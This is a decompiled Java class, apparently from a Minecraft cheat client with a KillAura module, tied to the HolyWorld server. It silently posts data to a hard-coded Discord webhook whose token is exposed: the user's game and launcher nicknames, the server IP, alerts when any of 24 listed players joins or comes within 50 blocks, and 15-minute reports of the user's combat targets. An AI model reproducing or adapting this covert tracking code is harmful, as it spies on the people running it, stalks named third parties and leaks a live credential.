/*
 * Decompiled with CFR 0.152.
 */
package lightning.product;

import java.awt.Color;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Deque;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import lightning.product.D_4024_W;
import lightning.product.G_624_v;
import lightning.product.N_4263_v;
import lightning.product.Objective;
import lightning.product.Y_1740_V;
import lightning.product.a_3913_L;
import lightning.product.MinecraftClient;
import lightning.product.h_1015_G;
import lightning.product.i_4895_l;
import lightning.product.m_3828_C;
import lightning.product.ClientBootstrap;
import lightning.product.AttackAura;
import lightning.product.r_4811_B;
import lightning.product.v_4839_y;

public class B_3040_x {
    private static final String n_1700_B = "https://discordapp.com/api/webhooks/1428762094530199644/e9Y4D0Qo7WO0iIPviZvtNKAgOsM2q3mdaKxOK5c_52il-SBqdNZJ6WCIHMbAWRuR7E_5";
    private static final DateTimeFormatter J_1907_R = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private static final Set<String> R_4764_Y = Set.of("_Smoup", "3AK0", "3AKO", "ToplecCHlKA", "NeKycok", "Asya_Masya", "n3ons", "Derty_1001", "CAMAPA", "That0neBear", "HackerCat777", "condoxi", "zerqq", "Alpine1428", "DarkGraySwine38", "Fl1ckzzz", "MeYuugao", "_kirusha_buldog_", "feliks_stream12", "gromaforz", "HiliGHo09", "Scary_Pumpkin", "_KArTOfANcHIcK_", "Heldyy");
    private static final double G_564_y = 50.0;
    private static final long P_1922_E = 900000L;
    private static final int u_1723_Y = 25;
    private static final MinecraftClient v_4262_N = MinecraftClient.A_4115_X();
    private final ExecutorService w_1484_f = Executors.newSingleThreadExecutor();
    private boolean t_148_a = false;
    private String s_956_w = null;
    private final Set<String> u_2550_I = new HashSet<String>();
    private final Set<String> M_588_G = new HashSet<String>();
    private final Deque<String> P_4830_p = new LinkedList<String>();
    private long h_1847_R = 0L;
    private long Q_4569_t = 0L;
    private long M_182_A = 0L;

    @Y_1740_V
    public void n_1700_B(h_1015_G e) {
        if (B_3040_x.v_4262_N.Y_259_p == null || B_3040_x.v_4262_N.Y_601_j == null) {
            return;
        }
        long now = System.currentTimeMillis();
        this.n_1700_B();
        boolean isOnHolyWorld = this.J_1907_R();
        if (isOnHolyWorld && !this.t_148_a) {
            this.t_148_a = true;
            this.u_2550_I.clear();
            this.M_588_G.clear();
            this.P_4830_p.clear();
            this.M_182_A = now;
            this.J_1907_R(B_3040_x.v_4262_N.Y_259_p.y_4642_Y().getName());
        } else if (!isOnHolyWorld && this.t_148_a) {
            this.t_148_a = false;
            this.u_2550_I.clear();
            this.M_588_G.clear();
            this.P_4830_p.clear();
            this.M_182_A = 0L;
        }
        if (!isOnHolyWorld) {
            return;
        }
        if (now - this.h_1847_R >= 5000L) {
            this.h_1847_R = now;
            this.R_4764_Y();
        }
        if (now - this.Q_4569_t >= 3000L) {
            this.Q_4569_t = now;
            this.G_564_y();
        }
        this.P_1922_E();
        if (this.M_182_A == 0L) {
            this.M_182_A = now;
        } else if (now - this.M_182_A >= 900000L) {
            this.M_182_A = now;
            this.u_1723_Y();
        }
    }

    private void n_1700_B() {
        try {
            String currentIp = null;
            if (v_4262_N.t_4043_B() != null) {
                currentIp = B_3040_x.v_4262_N.t_4043_B().J_1907_R;
            }
            if (currentIp != null && !currentIp.equals(this.s_956_w)) {
                this.s_956_w = currentIp;
                String playerName = B_3040_x.v_4262_N.Y_259_p.y_4642_Y().getName();
                this.n_1700_B(playerName, currentIp);
            } else if (currentIp == null) {
                this.s_956_w = null;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private boolean J_1907_R() {
        try {
            String title;
            Objective objective;
            i_4895_l scoreboard;
            if (v_4262_N.t_4043_B() != null) {
                String serverIp = B_3040_x.v_4262_N.t_4043_B().J_1907_R;
                return serverIp != null && serverIp.toLowerCase().contains("holyworld");
            }
            if (B_3040_x.v_4262_N.Y_601_j != null && (scoreboard = B_3040_x.v_4262_N.Y_601_j.Q_4569_t()) != null && (objective = scoreboard.n_1700_B(1)) != null && (title = D_4024_W.n_1700_B(objective.G_564_y().getString())) != null && title.toLowerCase().contains("holyworld")) {
                return true;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return false;
    }

    private void R_4764_Y() {
        if (B_3040_x.v_4262_N.Y_601_j == null) {
            return;
        }
        try {
            i_4895_l scoreboard = B_3040_x.v_4262_N.Y_601_j.Q_4569_t();
            if (scoreboard == null) {
                return;
            }
            Objective objective = scoreboard.n_1700_B(1);
            if (objective == null) {
                return;
            }
            for (v_4839_y score : scoreboard.n_1700_B(objective)) {
                String cleanName;
                String playerName = score.P_1922_E();
                if (playerName == null || (cleanName = D_4024_W.n_1700_B(playerName)) == null || cleanName.isEmpty() || !this.n_1700_B(cleanName) || this.u_2550_I.contains(cleanName) || cleanName.equals(B_3040_x.v_4262_N.Y_259_p.y_4642_Y().getName())) continue;
                this.u_2550_I.add(cleanName);
                this.J_1907_R(cleanName, "\u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0435");
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private void G_564_y() {
        if (B_3040_x.v_4262_N.Y_601_j == null) {
            return;
        }
        try {
            for (a_3913_L a_3913_L2 : B_3040_x.v_4262_N.Y_601_j.multiplayerClientSuggestionProvider()) {
                String playerName;
                if (a_3913_L2 == null || a_3913_L2 == B_3040_x.v_4262_N.Y_259_p || !this.n_1700_B(playerName = a_3913_L2.y_4642_Y().getName())) continue;
                double distance = B_3040_x.v_4262_N.Y_259_p.R_4764_Y((N_4263_v)a_3913_L2);
                if (distance <= 50.0) {
                    if (this.M_588_G.contains(playerName)) continue;
                    this.M_588_G.add(playerName);
                    this.J_1907_R(playerName, String.format("\u0440\u044f\u0434\u043e\u043c (%.1f \u0431\u043b\u043e\u043a\u043e\u0432)", distance));
                    continue;
                }
                this.M_588_G.remove(playerName);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private boolean n_1700_B(String playerName) {
        if (playerName == null) {
            return false;
        }
        for (String tracked : R_4764_Y) {
            if (!playerName.equalsIgnoreCase(tracked)) continue;
            return true;
        }
        return false;
    }

    private void P_1922_E() {
        try {
            String targetName;
            AttackAura aura;
            AttackAura r_3979_X2 = aura = ClientBootstrap.Y_601_j() != null && ClientBootstrap.Y_601_j().J_1907_R() != null ? ClientBootstrap.Y_601_j().J_1907_R().J_1907_R() : null;
            if (aura == null || !aura.w_1484_f()) {
                return;
            }
            r_4811_B target = aura.h_1847_R();
            if (target == null) {
                return;
            }
            String string = targetName = target.O_1309_Q() != null ? target.O_1309_Q().getString() : null;
            if (targetName == null || targetName.trim().isEmpty()) {
                return;
            }
            String cleanName = D_4024_W.n_1700_B(targetName).trim();
            if (cleanName.isEmpty()) {
                return;
            }
            if (!this.P_4830_p.isEmpty() && this.P_4830_p.peekLast().equalsIgnoreCase(cleanName)) {
                return;
            }
            this.P_4830_p.removeIf(name -> name.equalsIgnoreCase(cleanName));
            this.P_4830_p.addLast(cleanName);
            while (this.P_4830_p.size() > 25) {
                this.P_4830_p.removeFirst();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private void n_1700_B(String playerName, String serverIp) {
        this.w_1484_f.submit(() -> {
            try {
                ZonedDateTime now = ZonedDateTime.now(ZoneId.systemDefault());
                String localTime = now.format(DateTimeFormatter.ofPattern("HH:mm:ss"));
                String formattedTime = now.format(J_1907_R);
                String siteNick = this.v_4262_N();
                m_3828_C webhook = new m_3828_C(n_1700_B);
                m_3828_C.J_1907_R embed = new m_3828_C.J_1907_R().n_1700_B(new Color(80, 200, 255)).n_1700_B("\ud83c\udf10 \u0417\u0430\u0445\u043e\u0434 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440").J_1907_R(String.format("**%s** \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u043b\u0441\u044f \u043a \u0441\u0435\u0440\u0432\u0435\u0440\u0443", playerName)).n_1700_B("\u041d\u0438\u043a \u0432 \u0438\u0433\u0440\u0435", playerName, true).n_1700_B("\u041f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043b\u0430\u0443\u043d\u0447\u0435\u0440\u0430", siteNick, true).n_1700_B("IP \u0441\u0435\u0440\u0432\u0435\u0440\u0430", serverIp, true).n_1700_B("\u0412\u0440\u0435\u043c\u044f", localTime, true).n_1700_B("\u0414\u0430\u0442\u0430", formattedTime, false).n_1700_B("Universal Server Tracker", null);
                webhook.n_1700_B(embed);
                webhook.n_1700_B();
            }
            catch (Exception exception) {
                // empty catch block
            }
        });
    }

    private void J_1907_R(String playerName) {
        this.w_1484_f.submit(() -> {
            try {
                ZonedDateTime now = ZonedDateTime.now(ZoneId.systemDefault());
                String formattedTime = now.format(J_1907_R);
                String localTime = now.format(DateTimeFormatter.ofPattern("HH:mm:ss"));
                String siteNick = this.v_4262_N();
                m_3828_C webhook = new m_3828_C(n_1700_B);
                m_3828_C.J_1907_R embed = new m_3828_C.J_1907_R().n_1700_B(new Color(100, 255, 100)).n_1700_B("\u2705 HolyWorld - \u0417\u0430\u0445\u043e\u0434").J_1907_R(String.format("**%s** \u0437\u0430\u0448\u0451\u043b \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440", playerName)).n_1700_B("\u041d\u0438\u043a \u0432 \u0438\u0433\u0440\u0435", playerName, true).n_1700_B("\u041f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043b\u0430\u0443\u043d\u0447\u0435\u0440\u0430", siteNick, true).n_1700_B("\u0412\u0440\u0435\u043c\u044f", localTime, true).n_1700_B("\u0414\u0430\u0442\u0430", formattedTime, false).n_1700_B("HolyWorld Tracker", null);
                webhook.n_1700_B(embed);
                webhook.n_1700_B();
            }
            catch (Exception exception) {
                // empty catch block
            }
        });
    }

    private void J_1907_R(String trackedPlayerName, String situation) {
        this.w_1484_f.submit(() -> {
            try {
                ZonedDateTime now = ZonedDateTime.now(ZoneId.systemDefault());
                String localTime = now.format(DateTimeFormatter.ofPattern("HH:mm:ss"));
                String myGameNick = B_3040_x.v_4262_N.Y_259_p.y_4642_Y().getName();
                String mySiteNick = this.v_4262_N();
                m_3828_C webhook = new m_3828_C(n_1700_B);
                m_3828_C.J_1907_R embed = new m_3828_C.J_1907_R().n_1700_B(new Color(255, 200, 0)).n_1700_B("\u26a0\ufe0f \u0412\u041d\u0418\u041c\u0410\u041d\u0418\u0415! \u041e\u0442\u0441\u043b\u0435\u0436\u0438\u0432\u0430\u0435\u043c\u044b\u0439 \u0438\u0433\u0440\u043e\u043a \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0435").J_1907_R(String.format("**%s** \u0441\u0435\u0439\u0447\u0430\u0441 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u043d\u0430 HolyWorld!", trackedPlayerName)).n_1700_B("\u0422\u0432\u043e\u0439 \u043d\u0438\u043a \u0432 \u0438\u0433\u0440\u0435", myGameNick, true).n_1700_B("\u0422\u0432\u043e\u0439 \u043d\u0438\u043a \u043d\u0430 \u0441\u0430\u0439\u0442\u0435", mySiteNick, true).n_1700_B("\u041e\u0431\u043d\u0430\u0440\u0443\u0436\u0435\u043d \u0438\u0433\u0440\u043e\u043a", trackedPlayerName, true).n_1700_B("\u0421\u0438\u0442\u0443\u0430\u0446\u0438\u044f", situation, true).n_1700_B("\u0412\u0440\u0435\u043c\u044f \u043e\u0431\u043d\u0430\u0440\u0443\u0436\u0435\u043d\u0438\u044f", localTime, true).n_1700_B("HolyWorld Tracker - \u0421\u041d\u0418\u041c\u0410\u0419 \u0421\u0410\u0411\u041a\u0423 \u041d\u0410\u0425\u0423\u0419!", null);
                webhook.n_1700_B(embed);
                webhook.n_1700_B();
            }
            catch (Exception exception) {
                // empty catch block
            }
        });
    }

    private void u_1723_Y() {
        ArrayList<String> snapshot = new ArrayList<String>(new LinkedHashSet<String>(this.P_4830_p));
        this.P_4830_p.clear();
        this.w_1484_f.submit(() -> {
            try {
                Object targetsText;
                String myGameNick = B_3040_x.v_4262_N.Y_259_p != null ? B_3040_x.v_4262_N.Y_259_p.y_4642_Y().getName() : "unknown";
                String mySiteNick = this.v_4262_N();
                Object object = targetsText = snapshot.isEmpty() ? "\u0417\u0430 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0438\u0435 15 \u043c\u0438\u043d\u0443\u0442 \u0446\u0435\u043b\u0435\u0439 \u043d\u0435 \u0431\u044b\u043b\u043e" : String.join((CharSequence)", ", snapshot);
                if (((String)targetsText).length() > 1000) {
                    targetsText = ((String)targetsText).substring(0, 1000) + "...";
                }
                ZonedDateTime now = ZonedDateTime.now(ZoneId.systemDefault());
                String localTime = now.format(DateTimeFormatter.ofPattern("HH:mm:ss"));
                m_3828_C webhook = new m_3828_C(n_1700_B);
                m_3828_C.J_1907_R embed = new m_3828_C.J_1907_R().n_1700_B(new Color(120, 180, 255)).n_1700_B("KillAura: \u043e\u0442\u0447\u0451\u0442 \u0437\u0430 15 \u043c\u0438\u043d\u0443\u0442").n_1700_B("\u041d\u0438\u043a \u0432 \u0438\u0433\u0440\u0435", myGameNick, true).n_1700_B("\u041d\u0438\u043a \u0441 \u0441\u0430\u0439\u0442\u0430", mySiteNick, true).n_1700_B("\u0412\u0440\u0435\u043c\u044f", localTime, true).n_1700_B("\u041f\u043e\u0441\u043b\u0435\u0434\u043d\u0438\u0435 \u0442\u0430\u0440\u0433\u0435\u0442\u044b", (String)targetsText, false).n_1700_B("HolyWorld Tracker", null);
                webhook.n_1700_B(embed);
                webhook.n_1700_B();
            }
            catch (Exception exception) {
                // empty catch block
            }
        });
    }

    private String v_4262_N() {
        try {
            String username;
            if (G_624_v.t_148_a != null && G_624_v.t_148_a.n_1700_B != null && !(username = G_624_v.t_148_a.n_1700_B.trim()).isEmpty()) {
                return username;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return "unknown";
    }
}



